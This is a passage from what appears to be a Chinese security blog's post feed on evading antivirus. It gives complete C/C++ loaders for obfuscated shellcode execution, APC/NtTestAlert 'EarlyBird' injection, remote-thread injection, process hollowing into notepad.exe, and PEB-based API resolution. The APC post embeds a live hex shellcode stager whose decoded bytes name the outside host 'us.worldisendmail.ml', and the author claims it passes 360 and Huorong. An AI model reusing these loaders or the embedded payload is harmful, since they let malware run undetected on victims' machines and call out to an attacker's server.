(uiLibraryAddress + pExportDirectory-&gt;AddressOfNameOrdinals);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (((DWORD)lpProcName &amp; <span class="number">0xFFFF0000</span>) == <span class="number">0x00000000</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			uiAddressArray += ((IMAGE_ORDINAL((DWORD)lpProcName) - pExportDirectory-&gt;Base) * <span class="keyword">sizeof</span>(DWORD));</span><br><span class="line">			fpResult = (FARPROC)(uiLibraryAddress + DEREF_32(uiAddressArray));</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> </span><br><span class="line">		&#123;</span><br><span class="line">			DWORD dwCounter = pExportDirectory-&gt;NumberOfNames;</span><br><span class="line">			<span class="keyword">while</span> (dwCounter--)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="type">char</span>* cpExportedFunctionName = (<span class="type">char</span>*)(uiLibraryAddress + DEREF_32(uiNameArray));</span><br><span class="line">				<span class="comment">//</span></span><br><span class="line">				<span class="keyword">if</span> (<span class="built_in">strcmp</span>(cpExportedFunctionName, lpProcName) == <span class="number">0</span>)</span><br><span class="line">				&#123;</span><br><span class="line">					uiAddressArray += (DEREF_16(uiNameOrdinals) * <span class="keyword">sizeof</span>(DWORD));</span><br><span class="line">					fpResult = (FARPROC)(uiLibraryAddress + DEREF_32(uiAddressArray));</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				uiNameArray += <span class="keyword">sizeof</span>(DWORD);</span><br><span class="line">				uiNameOrdinals += <span class="keyword">sizeof</span>(WORD);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	__except (EXCEPTION_EXECUTE_HANDLER)</span><br><span class="line">	&#123;</span><br><span class="line">		fpResult = <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> fpResult;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="comment">//创建共享内存映射一个ntdll</span></span><br><span class="line">	<span class="comment">//使用CreateFileA 打开文件</span></span><br><span class="line">	HANDLE hNtdllfile = CreateFileA(<span class="string">&quot;c:\\windows\\system32\\ntdll.dll&quot;</span>, GENERIC_READ, FILE_SHARE_READ, <span class="literal">NULL</span>, OPEN_EXISTING, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="comment">//创建共享内存的内存映射对象</span></span><br><span class="line">	HANDLE hNtdllMapping = CreateFileMapping(hNtdllfile, <span class="literal">NULL</span>, PAGE_READONLY | SEC_IMAGE, <span class="number">0</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="comment">//得到该内存空间的映射地址</span></span><br><span class="line">	LPVOID lpNtdllmaping = MapViewOfFile(hNtdllMapping, FILE_MAP_READ, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">	</span><br><span class="line">	pNtAllocateVirtualMemory NtAllocateVirtualMemory = (pNtAllocateVirtualMemory)GetProcAddressR((HMODULE)lpNtdllmaping, <span class="string">&quot;NtAllocateVirtualMemory&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> err = GetLastError();</span><br><span class="line">	LPVOID Address = <span class="literal">NULL</span>;</span><br><span class="line">	SIZE_T uSize = <span class="number">0x1000</span>;</span><br><span class="line">	NTSTATUS status = NtAllocateVirtualMemory(GetCurrentProcess(), &amp;Address, <span class="number">0</span>, &amp;uSize, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>


<h4 id="References"><a href="#References" class="headerlink" title="References"></a>References</h4><p><a href="https://idiotc4t.com/defense-evasion/reload-ntdll-.text-section">https://idiotc4t.com/defense-evasion/reload-ntdll-.text-section</a><br><a href="https://idiotc4t.com/defense-evasion/load-ntdll-too">https://idiotc4t.com/defense-evasion/load-ntdll-too</a></p>
]]></content>
      <categories>
        <category>Bypass</category>
      </categories>
      <tags>
        <tag>Bypass</tag>
      </tags>
  </entry>
  <entry>
    <title>代码混淆</title>
    <url>/posts/3497b4c5/</url>
    <content><![CDATA[<p><a href="https://idiotc4t.com/defense-evasion/compile-time-obfuscation">https://idiotc4t.com/defense-evasion/compile-time-obfuscation</a><br>该工具可以在编译时混淆函数调用 也可以混淆字符串，对杀毒软件判断的静态特征产生很大程度的避免，同时混淆函数调用也能对行为查杀产生一定程度的影响</p>
<p>导入需要的头文件 需要安装boost 在vs中进行配置，添加附加包含目录</p>
<p><img src="/posts/3497b4c5/1.png"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> !defined(DEBUG) || DEBUG == 0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BOOST_DISABLE_ASSERTS</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>(disable: 4503)</span></span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ADVLOG 1</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;Log.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;MetaString.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;ObfuscatedCall.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;ObfuscatedCallWithPredicate.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker, <span class="string">&quot;/section:.data,RWE&quot;</span>)   </span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker,<span class="string">&quot;/subsystem:\&quot;windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;</span>)  </span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker, <span class="string">&quot;/INCREMENTAL:NO&quot;</span>) </span></span><br><span class="line"></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line">using namespace andrivet::ADVobfuscator;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> buf[] = <span class="string">&quot;shellcode&quot;</span>; <span class="comment">//这里不能使用常规的shellcode 常规的shellcode已被杀软记录在样本库中 会根据此shellcode查杀</span></span><br><span class="line">  </span><br><span class="line"><span class="type">void</span> <span class="title function_">exec</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	((<span class="type">void</span>(*)(<span class="type">void</span>))&amp;buf)();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span>, <span class="type">const</span> <span class="type">char</span>*[])</span></span><br><span class="line">&#123;</span><br><span class="line">	OBFUSCATED_CALL0(exec);</span><br><span class="line">	<span class="comment">//exec();</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h4 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h4><p><a href="https://idiotc4t.com/defense-evasion/compile-time-obfuscation">https://idiotc4t.com/defense-evasion/compile-time-obfuscation</a><br><a href="https://blog.csdn.net/u010921682/article/details/80179732">https://blog.csdn.net/u010921682/article/details/80179732</a></p>
]]></content>
  </entry>
  <entry>
    <title>APC注入_NtTestAlert</title>
    <url>/posts/5788eae8/</url>
    <content><![CDATA[<p>EarlyBird 本质上是一种APC注入与线程劫持的编制，在线程初始化时会调用ntdll中的未导出函数<code>NtTestAlert</code>  <code>NtTestAlert</code>是一个检查当前线程的APC队列的函数，如果有任何排队的作业，他会清空队列。当线程启动时<code>NtTestAlert</code>会在<em>执行任何操作之前</em>被调用。因此在线程开始状态下对APC进行操，那就可以完美执行shellcode。该方法被用来BypassAV/Edrhook的过程，它驶入在AV/EDR有机会将其挂钩放在新创建的进程中之前运行shellcode.</p>
<p>步骤:</p>
<ul>
<li>1.创建一个挂起状态的进程<br>(如果是将shellcode注入到本地进程，那么可以使用APC到当前进程在去调用NtTestAlert)<br>CreateProcessA( …, CREATE_SUSPENDED, …)` 便可创建一个挂起状态的进程.</li>
<li>2.为shellcode分配内存空间,写入shellcode</li>
<li>3.插入APC到主线程(当前线程)</li>
<li>4.调用NtTestAlert()执行shellcode</li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;ntdll&quot;</span>)</span></span><br><span class="line"><span class="keyword">using</span> myNtTestAlert = <span class="built_in">NTSTATUS</span>(NTAPI*)();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">char</span> buf[] = <span class="string">&quot;fce8890000006089e531d2648b52308b520c8b52148b72280fb74a2631ff31c0ac3c617c022c20c1cf0d01c7e2f052578b52108b423c01d08b407885c0744a01d0508b48188b582001d3e33c498b348b01d631ff31c0acc1cf0d01c738e075f4037df83b7d2475e2588b582401d3668b0c4b8b581c01d38b048b01d0894424245b5b61595a51ffe0585f5a8b12eb865d686e6574006877696e6954684c772607ffd5e80000000031ff5757575757683a5679a7ffd5e9a40000005b31c951516a03515168fb20000053506857899fc6ffd550e98c0000005b31d252680032c08452525253525068eb552e3bffd589c683c350688033000089e06a04506a1f566875469e86ffd55f31ff57576aff5356682d06187bffd585c00f84ca01000031ff85f6740489f9eb0968aac5e25dffd589c16845215e31ffd531ff576a0751565068b757e00bffd5bf002f000039c775075850e97bffffff31ffe991010000e9c9010000e86fffffff2f5877424b00c638b6057378a894eecf7bc1aa53ba78900a3bb158655591a5330461ce3d74a0e14842e13a75861c930427a411f354079ef04a095ad081b8e47fe04ded2f08e0fc010136d933a1807300557365722d4167656e743a204d6f7a696c6c612f352e30202857696e646f7773204e5420362e313b20574f5736343b2054726964656e742f372e303b2072763a31312e3029206c696b65204765636b6f0d0a486f73743a2075732e776f726c646973656e646d61696c2e6d6c0d0a007fef054e2008ae77070f044f1087a24772a18e66fbc21da7ae0deb5058231549208008c5c1d40c32c9f88b3e85652e58a3ca12e34ad665175870d1fc6d165493374260b2c750510707a5328dbaf92eab4f0b92fa87e05815da018b2c9a4a322ff33122f6bb9634cb1790d825298529cb30e5f01f7e6cdfba37bd78b967e41a7ece26d438f78459445dbdd9e7b1c7e0adf81b0c58a4d3ecf83e57191cbeb494683b9b25b3dd9bb903b1421b77de08b283b4e28820e49b04b8b303f85c4d1495900068f0b5a256ffd56a4068001000006800004000576858a453e5ffd593b90000000001d9515389e7576800200000535668129689e2ffd585c074c68b0701c385c075e558c3e889fdffff75732e776f726c646973656e646d61696c2e6d6c00499602d2&quot;</span>;</span><br><span class="line">	</span><br><span class="line">	myNtTestAlert testAlert = (myNtTestAlert)(<span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandleA</span>(<span class="string">&quot;ntdll&quot;</span>), <span class="string">&quot;NtTestAlert&quot;</span>));</span><br><span class="line"></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> char_in_hex;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> iterations = <span class="built_in">strlen</span>(buf);</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> memory_allocation = <span class="built_in">strlen</span>(buf) / <span class="number">2</span>;</span><br><span class="line">	<span class="comment">//由于字符串编译后默认写入不可写的PE段，所以需要修改内存属性</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">unsigned</span> <span class="type">int</span> i = <span class="number">0</span>; i &lt; iterations / <span class="number">2</span>; i++) &#123; <span class="comment">//减小开销</span></span><br><span class="line">		<span class="built_in">sscanf_s</span>(buf + <span class="number">2</span> * i, <span class="string">&quot;%2X&quot;</span>, &amp;char_in_hex);</span><br><span class="line">		buf[i] = (<span class="type">char</span>)char_in_hex;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	LPVOID shellAddress = <span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, memory_allocation, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">WriteProcessMemory</span>(<span class="built_in">GetCurrentProcess</span>(), shellAddress, buf, memory_allocation, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellAddress;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//插入APC到当前线程</span></span><br><span class="line">	<span class="built_in">QueueUserAPC</span>((PAPCFUNC)apcRoutine, <span class="built_in">GetCurrentThread</span>(), <span class="literal">NULL</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//APC队列不为空马上运行</span></span><br><span class="line">	<span class="built_in">testAlert</span>();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可过 360、火绒</p>
<h4 id="References"><a href="#References" class="headerlink" title="References"></a>References</h4><p><a href="https://d3sh1n.github.io/2022/01/06/APC-%E6%B3%A8%E5%85%A5%EF%BC%88%E4%B8%80%EF%BC%89/">https://d3sh1n.github.io/2022/01/06/APC-%E6%B3%A8%E5%85%A5%EF%BC%88%E4%B8%80%EF%BC%89/</a><br><a href="https://cn-sec.com/archives/406854.html">https://cn-sec.com/archives/406854.html</a><br><a href="https://www.anquanke.com/post/id/252487">https://www.anquanke.com/post/id/252487</a><br><a href="https://xz.aliyun.com/t/11153#toc-8">https://xz.aliyun.com/t/11153#toc-8</a><br><a href="https://www.anquanke.com/post/id/252487#h2-2">https://www.anquanke.com/post/id/252487#h2-2</a><br><a href="https://myzxcg.com/2022/01/Windows-Shellcode-%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF/">https://myzxcg.com/2022/01/Windows-Shellcode-%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF/</a></p>
]]></content>
      <categories>
        <category>Bypass</category>
      </categories>
      <tags>
        <tag>Bypass</tag>
      </tags>
  </entry>
  <entry>
    <title>进程注入_AND_ProcessHollowing</title>
    <url>/posts/5e5076eb/</url>
    <content><![CDATA[<h4 id="远线程注入"><a href="#远线程注入" class="headerlink" title="远线程注入"></a>远线程注入</h4><p>注入到带有签名的白名单程序中</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> buf[] = <span class="string">&quot;异或后的shellcode&quot;</span>;</span><br><span class="line"></span><br><span class="line">INT <span class="title function_">FoundPid</span><span class="params">(<span class="type">const</span> <span class="type">wchar_t</span>* szName)</span> &#123;</span><br><span class="line">	<span class="comment">// 设置变量</span></span><br><span class="line">	PROCESSENTRY32 pe = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	HANDLE hSnapShot = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="type">int</span> pid = <span class="number">0</span>;</span><br><span class="line">	<span class="comment">// 初始化大小</span></span><br><span class="line">	pe.dwSize = <span class="keyword">sizeof</span>(PROCESSENTRY32);</span><br><span class="line">	<span class="comment">// 创建进程快照</span></span><br><span class="line">	hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (hSnapShot != INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">		<span class="comment">// 获取快照</span></span><br><span class="line">		BOOL Process = Process32First(hSnapShot, &amp;pe);</span><br><span class="line">		<span class="keyword">if</span> (!Process) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// 遍历快照</span></span><br><span class="line">		<span class="keyword">while</span> (Process32Next(hSnapShot, &amp;pe)) &#123;</span><br><span class="line">			<span class="comment">// 判断进程名是否相同</span></span><br><span class="line">			<span class="keyword">if</span> (!_wcsicmp(szName, pe.szExeFile)) &#123;</span><br><span class="line">				pid = pe.th32ProcessID;</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;[+] 找到指定进程pid: %d\n&quot;</span>, pe.th32ProcessID);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		CloseHandle(hSnapShot);</span><br><span class="line">		<span class="keyword">return</span> pid;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[-] 进程快照创建失败!\t错误值: %d\n&quot;</span>, GetLastError());</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">InjectShellCode</span><span class="params">(<span class="type">const</span> <span class="type">wchar_t</span>* szName)</span></span><br><span class="line">&#123;</span><br><span class="line">	HANDLE Handle, remoteThread;</span><br><span class="line">	PVOID remoteBuffer;</span><br><span class="line">	<span class="type">int</span> Pid = FoundPid(szName);</span><br><span class="line">	Handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Pid);</span><br><span class="line">	<span class="comment">// 还原异或</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(buf); i++) &#123;</span><br><span class="line">		buf[i] ^= <span class="number">50</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	remoteBuffer = VirtualAllocEx(Handle, <span class="literal">NULL</span>, <span class="keyword">sizeof</span>(buf), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);</span><br><span class="line">	WriteProcessMemory(Handle, remoteBuffer, buf, <span class="keyword">sizeof</span>(buf), <span class="literal">NULL</span>);</span><br><span class="line">	remoteThread = CreateRemoteThread(Handle, <span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)remoteBuffer, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">	CloseHandle(Handle);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">	InjectShellCode(<span class="string">L&quot;notepad.exe&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h4 id="傀儡进程-Process-Hollowing"><a href="#傀儡进程-Process-Hollowing" class="headerlink" title="傀儡进程 Process Hollowing"></a>傀儡进程 Process Hollowing</h4><p>傀儡进程：创建一个进程，然后将其虚拟地址里的内容掏空，注入想要注入的进程，以达到掩人耳目的效果</p>
<ul>
<li><ol>
<li>创建挂起进程<br><code>CreateProcess(PATH_TO_HOST_EXE, ..., CREATE_SUSPENDED, ...)</code> 便可创建一个挂起状态的进程.</li>
</ol>
</li>
<li><ol start="2">
<li>获取进程上下文结构<br>使用 <code>GetThreadContext()</code> 获取进程上下文（寄存器状态）</li>
</ol>
</li>
<li><ol start="3">
<li>写入傀儡进程(申请内存空间，写入shellcode)<br><code>VirtualAllocEx() </code> 重新分配空间大小为傀儡进程的大小，<code>WriteProcessMemory()</code> 向分配的空间写入傀儡进程.</li>
</ol>
</li>
<li><ol start="4">
<li>恢复现场(设置上下文，恢复线程)<br>由于目标进程和傀儡进程的入口点一般不同，所以在恢复前需要更改线程入口点，使用 <code>SetThreadContext</code> 函数，最后使用 <code>ResumeThread</code> 函数释放运行.</li>
</ol>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> buf[] = <span class="string">&quot;异或的shellcode&quot;</span>;</span><br><span class="line"></span><br><span class="line">BOOL <span class="title function_">ReplaceProcess</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *pszFilePath)</span></span><br><span class="line">&#123;</span><br><span class="line">	STARTUPINFO si = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	PROCESS_INFORMATION pi = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	CONTEXT threadContext = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	BOOL bRet = FALSE;</span><br><span class="line">	RtlZeroMemory(&amp;si, <span class="keyword">sizeof</span>(si));</span><br><span class="line">	RtlZeroMemory(&amp;pi, <span class="keyword">sizeof</span>(pi));</span><br><span class="line">	RtlZeroMemory(&amp;threadContext, <span class="keyword">sizeof</span>(threadContext));</span><br><span class="line">	si.cb = <span class="keyword">sizeof</span>(si);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// 创建进程并挂起主线程</span></span><br><span class="line">	bRet = CreateProcessA(pszFilePath, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, FALSE, CREATE_SUSPENDED, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;si, &amp;pi);</span><br><span class="line">	<span class="keyword">if</span> (FALSE == bRet)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;CreateProcess&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// 在替换的进程中申请一块内存</span></span><br><span class="line">	LPVOID lpDestBaseAddr = VirtualAllocEx(pi.hProcess, <span class="literal">NULL</span>, <span class="keyword">sizeof</span>(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line">	<span class="keyword">if</span> (<span class="literal">NULL</span> == lpDestBaseAddr)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;VirtualAllocEx&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// 还原异或</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(buf); i++) &#123;</span><br><span class="line">		buf[i] ^= <span class="number">50</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 写入替换的数据</span></span><br><span class="line">	bRet = WriteProcessMemory(pi.hProcess, lpDestBaseAddr, buf, <span class="keyword">sizeof</span>(buf), <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (FALSE == bRet)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;WriteProcessError&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// 获取线程上下文</span></span><br><span class="line">	<span class="comment">// 注意此处标志，一定要写!!!</span></span><br><span class="line">	threadContext.ContextFlags = CONTEXT_FULL;</span><br><span class="line">	bRet = GetThreadContext(pi.hThread, &amp;threadContext);</span><br><span class="line">	<span class="keyword">if</span> (FALSE == bRet)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;GetThreadContext&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">// 修改eip从新申请的内存处运行</span></span><br><span class="line">	threadContext.Rip = (DWORD64)lpDestBaseAddr;</span><br><span class="line">	<span class="comment">// 设置挂起进程的线程上下文</span></span><br><span class="line">	bRet = SetThreadContext(pi.hThread, &amp;threadContext);</span><br><span class="line">	<span class="keyword">if</span> (FALSE == bRet)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;SetThreadContext&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 恢复挂起的进程的线程</span></span><br><span class="line">	ResumeThread(pi.hThread);</span><br><span class="line">	WaitForSingleObject(pi.hThread, INFINITE);</span><br><span class="line">	CloseHandle(pi.hThread);</span><br><span class="line">	CloseHandle(pi.hProcess);</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">	ReplaceProcess(<span class="string">&quot;C:\\Windows\\System32\\notepad.exe&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="References"><a href="#References" class="headerlink" title="References"></a>References</h4><p><a href="https://bbs.pediy.com/thread-224706.htm">https://bbs.pediy.com/thread-224706.htm</a><br><a href="https://jev0n.com/2020/03/11/65.html">https://jev0n.com/2020/03/11/65.html</a><br><a href="https://www.cnblogs.com/bonelee/p/15957493.html">https://www.cnblogs.com/bonelee/p/15957493.html</a><br><a href="https://juejin.cn/post/6844903587626090503#process-hollowing">https://juejin.cn/post/6844903587626090503#process-hollowing</a><br><a href="https://www.52pojie.cn/thread-501486-1-1.html">https://www.52pojie.cn/thread-501486-1-1.html</a><br><a href="https://github.com/m0n0ph1/Process-Hollowing">https://github.com/m0n0ph1/Process-Hollowing</a></p>
]]></content>
      <categories>
        <category>Bypass</category>
      </categories>
      <tags>
        <tag>Bypass</tag>
      </tags>
  </entry>
  <entry>
    <title>动态获取API</title>
    <url>/posts/224ae4c2/</url>
    <content><![CDATA[<p>杀软有时不仅会检查内部特征，也会检查导入表中是否含有敏感函数。通常会对 PE 文件的导入表通过计算 hash 值进行对比，看有没有敏感函数，如果有会进行额外的检测。<br>动态获取主要是通过找到 kernerl32. dll。这样就不会再导入表出现 VirtualProtect</p>
<p><strong>TEB</strong>（Thread Environment Block，线程环境块）系统在此 TEB 中保存频繁使用的线程相关的数据。位于用户地址空间，在比 PEB 所在地址低的地方。用户模式下，当前线程的 TEB 位于独立的 4KB 段 (页)，可通过 CPU 的 FS 寄存器来访问该段，一般存储在[FS: 0]</p>
<p><strong>PEB</strong>（Process Environment Block，进程环境块）存放进程信息，每个进程都有自己的PEB信息。位于用户地址空间。可在TEB结构地址偏移0x30处获得PEB的地址位置。</p>
<p>使用 windbg 查看 teb 结构<br><code>dt -rl _teb</code><br><img src="/posts/224ae4c2/1.png"></p>
<p>在+0x30 处为 peb 地址<br>通过 <code>fs:[0]</code> 寄存器访问到 TEB 的地址，这里我们又知道了可以通过 <code>TEB</code> 结构偏移 0x30 处指向的地址是 PEB 结构地址，即 <code>fs:[0]</code> -&gt; <code>TEB</code> -&gt; <code>PEB</code>，在这一步完成 PEB 地址的定位.<br><code>dt -rl _peb</code><br><img src="/posts/224ae4c2/2.png"></p>
<p>在 peb 偏移 0xc 处位 ldf 结构的地址, 在 ldr 下存在三个双链表结构，这三个为模块在不同状态的顺序</p>
<p><a href="https://mamor5409.github.io/posts/9aa42a48/">https://mamor5409.github.io/posts/9aa42a48/</a> 参考之前写的</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line">HMODULE  <span class="title function_">GetKernel32Addr</span><span class="params">()</span> &#123;</span><br><span class="line">	HMODULE Kernel32Base = <span class="number">0</span>;</span><br><span class="line">	_asm &#123;</span><br><span class="line">		mov eax, fs:[<span class="number">0x30</span>] <span class="comment">//peb</span></span><br><span class="line">		mov eax, dword ptr[eax + <span class="number">0xc</span>]<span class="comment">//_PEB_LDR_DATA</span></span><br><span class="line">		mov eax, dword ptr[eax + <span class="number">0xc</span>]<span class="comment">//InLoadOrderModuleList </span></span><br><span class="line">		mov eax, [eax] <span class="comment">//ntdll</span></span><br><span class="line">		mov eax, [eax] <span class="comment">//kernel32dll</span></span><br><span class="line">		mov eax, dword ptr[eax + <span class="number">0x18</span>]</span><br><span class="line">		mov Kernel32Base, eax</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> Kernel32Base;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title 